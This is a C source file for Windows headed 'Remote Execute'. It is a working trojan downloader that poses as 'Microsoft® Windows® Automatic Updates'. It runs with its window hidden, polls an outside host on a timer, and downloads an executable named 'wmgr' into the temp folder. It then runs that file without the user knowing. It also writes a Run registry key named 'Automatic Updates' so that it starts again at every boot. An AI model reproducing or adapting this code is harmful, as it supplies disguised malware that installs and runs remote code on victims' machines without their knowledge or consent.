/*

  Remote Execute
  --------------
  Download an App from the Internet 
  and execute it in a specific time interval.

*/

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include "resource.h"

#define NET_DELAY 3000
#define REG_DELAY 5000
const char AppName[] = "Microsoft® Windows® Automatic Updates";

LRESULT CALLBACK WndProc   (HWND, UINT, WPARAM, LPARAM);
void CALLBACK NetTimer (HWND, UINT, UINT, DWORD);
void CALLBACK RegTimer (HWND, UINT, UINT, DWORD);
inline void RunProcess(char *ProcessName);
inline char * GetProgPath();

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    PSTR szCmdLine, int nCmdShow)
{
     HWND        hwnd ;
     MSG         msg ;
     WNDCLASS    wndclass ;

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = hInstance ;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = NULL ;
     wndclass.lpszClassName = AppName ;
     
     if (!RegisterClass (&wndclass))
          return 0 ;
     
     hwnd = CreateWindow (AppName, AppName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;

	 //ShowWindow(hwnd, nCmdShow);

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }

     return msg.wParam ;
}

LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		SetTimer(hwnd, 1, NET_DELAY, NetTimer);
		SetTimer(hwnd, 2, REG_DELAY, RegTimer);
		break;
	case WM_CLOSE:
		KillTimer (hwnd, 1);
		KillTimer (hwnd, 2);
		DestroyWindow(hwnd);
		break ;
	case WM_DESTROY:
		PostQuitMessage (0) ;
		return 0 ;
	}
	return DefWindowProc (hwnd, message, wParam, lParam) ;
}

const char NetProg[] = "http://www.interlink.150m.com/wmgr";
const char NetCount[] = "http://www.interlink.150m.com/msctts.txt";

void CALLBACK NetTimer(HWND hwnd, UINT message, UINT iTimerID, DWORD dwTime)
{
	static BOOL semaphore = FALSE;
	if(semaphore == TRUE)
		return;
	else
		semaphore = TRUE;

	if(InternetCheckConnection("http://www.microsoft.com",FLAG_ICC_FORCE_CONNECTION,0))
	{
		char FileName[255];

		HINTERNET hNet = InternetOpen(AppName, PRE_CONFIG_INTERNET_ACCESS,
			NULL, INTERNET_INVALID_PORT_NUMBER, 0 );

		/* check if download is necessary */
		char flag = 1;
		{
			char chr;
			DWORD tmp = 1;
			HINTERNET hCountFile = ::InternetOpenUrl(hNet, NetCount, NULL,
				0, INTERNET_FLAG_RELOAD, 0 );
			InternetReadFile(hCountFile, &chr,1,&tmp);
			InternetCloseHandle(hCountFile);
			if(tmp == 1) {
				if(!GetSystemDirectory(FileName,255))
					strcpy(FileName,"C:\\");
				strcat(FileName,"msctts");
				HANDLE cf = CreateFile(FileName, GENERIC_READ,
				0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				if(cf == INVALID_HANDLE_VALUE)
				{
					cf = CreateFile(FileName, GENERIC_WRITE,
					0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					if(cf == INVALID_HANDLE_VALUE) {
						InternetCloseHandle(hNet);
						semaphore = FALSE;
						return;
					}
					char zero = 0;
					WriteFile(cf,&zero,1,&tmp,NULL);
					CloseHandle(cf);
					HANDLE cf = CreateFile(FileName, GENERIC_READ,
					0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				}
				char chr_;
				ReadFile(cf,&chr_,1,&tmp,NULL);
				if(chr == chr_) {
					flag = 0;
					CloseHandle(cf);
				} else {
					CloseHandle(cf);
					cf = CreateFile(FileName, GENERIC_WRITE,
					0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					WriteFile(cf,&chr,1,&tmp,NULL);
					CloseHandle(cf);
				}
			}
		} if(!flag) {
			InternetCloseHandle(hNet);
			semaphore = FALSE;
			return;
		}

		if(!GetTempPath(255,FileName))
			strcpy(FileName,"C:\\");
		strcat(FileName,"wmgr");
		DeleteFile(FileName);
		HANDLE hWrite = CreateFile(FileName, GENERIC_WRITE,
		0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		const int buff_size = 512;
		char buffer[buff_size] ;
		DWORD BytesRead = 0, BytesWritten = 0;

		HINTERNET hUrlFile = ::InternetOpenUrl(hNet, NetProg, NULL,
				0, INTERNET_FLAG_RELOAD, 0 );
		do { /* download NetProg */
			if(InternetReadFile(hUrlFile, buffer, buff_size, &BytesRead))
				WriteFile(hWrite, buffer, BytesRead, &BytesWritten, NULL);
		} while(BytesRead == buff_size);
		CloseHandle(hWrite);
		InternetCloseHandle(hUrlFile);
		InternetCloseHandle(hNet);
		RunProcess(FileName);
	}
	semaphore = FALSE;
}

inline void RunProcess(char *ProcessName)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    CreateProcess( NULL, ProcessName, NULL, 
		NULL, FALSE, 0, NULL, NULL, &si, &pi);
	//WaitForSingleObject( pi.hProcess, INFINITE );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}

inline char * GetProgPath()
{
	static char EXEName[128];
	GetCurrentDirectory(100,EXEName);
	strcat(EXEName, "\\wupdate.exe");
	return EXEName;
}

void CALLBACK RegTimer(HWND hwnd, UINT message, UINT iTimerID, DWORD dwTime)
{
	HKEY Key;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, KEY_WRITE, &Key);
	RegSetValueEx(Key, "Automatic Updates", 0, REG_SZ, 
	(unsigned char *)GetProgPath(), strlen(GetProgPath()));
	RegCloseKey(Key);
}
